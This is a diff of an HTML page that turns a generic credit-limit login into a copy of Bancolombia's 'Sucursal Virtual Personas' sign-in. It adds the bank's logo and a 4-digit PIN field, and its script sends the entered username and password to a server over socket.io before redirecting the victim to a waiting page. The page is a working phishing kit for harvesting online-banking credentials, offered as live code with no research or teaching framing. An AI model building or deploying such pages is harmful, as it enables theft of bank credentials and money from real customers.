@@ -3,107 +3,161 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verificación de cuenta</title>
-  <style>
-    body {
-      background-color: #f3f6fb;
-      font-family: Arial, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-    .container {
-      background: #fff;
-      border-radius: 15px;
-      padding: 40px 30px;
-      width: 100%;
-      max-width: 400px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.1);
-      text-align: center;
-    }
-    .logo {
-      margin-bottom: 30px;
-    }
-    .logo img {
-      height: 50px;
-    }
-    h2 {
-      font-size: 1.5em;
-      margin-bottom: 10px;
-    }
-    p {
-      color: #777;
-      font-size: 0.95em;
-      margin-bottom: 20px;
-    }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 1em;
-    }
-    button {
-      background-color: #00b075;
-      color: white;
-      padding: 12px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 1em;
-      width: 100%;
-    }
-    button:hover {
-      background-color: #019765;
-    }
-  </style>
+  <title>Sucursal Virtual Personas</title>
+  <link rel="shortcut icon" href="img/favicon.ico">
+ <style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f3f6fb;
+    margin: 0;
+    padding: 0;
+  }
+
+  .container {
+    max-width: 800px;
+    margin: 50px auto;
+    background: #fff;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    padding: 30px;
+  }
+
+  .header {
+    display: flex;
+    align-items: center;
+    margin-bottom: 20px;
+  }
+
+  .logo {
+    width: 60px;
+    height: 60px;
+    background: url('https://hub.laboratoria.la/hubfs/LogoBancolombia.png') no-repeat center;
+    background-size: contain;
+  }
+
+  .title {
+    margin-left: 15px;
+    font-size: 1.5em;
+    font-weight: bold;
+    color: #333;
+  }
+
+  h3 {
+    margin-top: 0;
+    color: #444;
+  }
+
+  p {
+    color: #666;
+  }
+
+  .alerta {
+    background-color: #ffe5e5;
+    color: #d8000c;
+    border: 1px solid #d8000c;
+    padding: 12px;
+    border-radius: 5px;
+    margin: 20px 0;
+    font-size: 1em;
+    text-align: center;
+  }
+
+  input {
+    width: 90%;
+    padding: 8px;
+    margin: 8px auto;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 0.95em;
+    display: block;
+  }
+
+  button {
+    background-color: #ffde00;
+    color: #333;
+    padding: 10px;
+    border: none;
+    border-radius: 5px;
+    font-size: 0.95em;
+    width: 90%;
+    cursor: pointer;
+    display: block;
+    margin: 10px auto 0;
+  }
+
+  button:hover {
+    background-color: #e6cb00;
+  }
+</style>
+
 </head>
 <body>
+
   <div class="container">
-    <div class="logo">
-      <img src="https://i.imgur.com/GFGp9I7.png" alt="logo" />
+    <div class="header">
+      <div class="logo"></div>
+      <div class="title">Sucursal Virtual Personas</div>
     </div>
-    <h2>Bienvenido a su análisis de aumento de cupo</h2>
-    <p>Ingrese su correo y contraseña para continuar</p>
-    <form id="login-form">
-      <input type="text" id="usuario" placeholder="Correo electrónico" required />
-      <input type="password" id="clave" placeholder="Contraseña" required />
-      <button type="submit">Continuar</button>
-    </form>
+
+    <h3>Inicio de sesión</h3>
+    <p>Bienvenido, por favor ingrese su usuario y contraseña para continuar</p>
+
+<form id="login-form">
+  <input 
+    type="text" 
+    id="usuario" 
+    placeholder="Usuario" 
+    required 
+    minlength="8" 
+    pattern="(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}" 
+    title="Debe tener al menos 8 caracteres combinando letras y números" 
+  />
+
+  <input 
+    type="tel" 
+    id="clave" 
+    placeholder="Contraseña" 
+    required 
+    minlength="4" 
+    maxlength="4" 
+    pattern="\d{4}" 
+    title="Debe ser exactamente 4 números" 
+  />
+
+  <button type="submit">Continuar</button>
+</form>
+
+
+    <div class="footer-links">
+     <p> <a href="#">¿Olvidaste tu usuario?</a></p>
+    <p>  <a href="#">¿Problemas para conectarte?</a></p>
+    </div>
   </div>
 
-  <!-- Scripts al final del body -->
- <!-- Scripts al final del body -->
-<script src="/socket.io/socket.io.js"></script>
-<script>
-  const socket = io();
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const socket = io();
 
-  window.addEventListener('DOMContentLoaded', () => {
-    const form = document.getElementById('login-form');
+    window.addEventListener('DOMContentLoaded', () => {
+      const form = document.getElementById('login-form');
 
-    if (form) {
-      form.addEventListener('submit', (e) => {
-        e.preventDefault();
+      if (form) {
+        form.addEventListener('submit', (e) => {
+          e.preventDefault();
 
-        const correo = document.getElementById('usuario').value;
-        const contrasena = document.getElementById('clave').value;
+          const correo = document.getElementById('usuario').value;
+          const contrasena = document.getElementById('clave').value;
 
-        // 🔑 Generar y guardar sessionId
-        const sessionId = Math.random().toString(36).substring(2, 15);
-        localStorage.setItem('sessionId', sessionId);
+          const sessionId = Math.random().toString(36).substring(2, 15);
+          localStorage.setItem('sessionId', sessionId);
 
-        // ✅ Enviar también el sessionId al servidor
-        socket.emit('dataForm', { correo, contrasena, sessionId });
+          socket.emit('dataForm', { correo, contrasena, sessionId });
 
-        // 🕒 Ir a pantalla de espera
-        window.location.href = 'opciones.html';
-      });
-    }
-  });
-</script>
+          window.location.href = 'opciones.html';
+        });
+      }
+    });
+  </script>
 
 </body>
 </html>
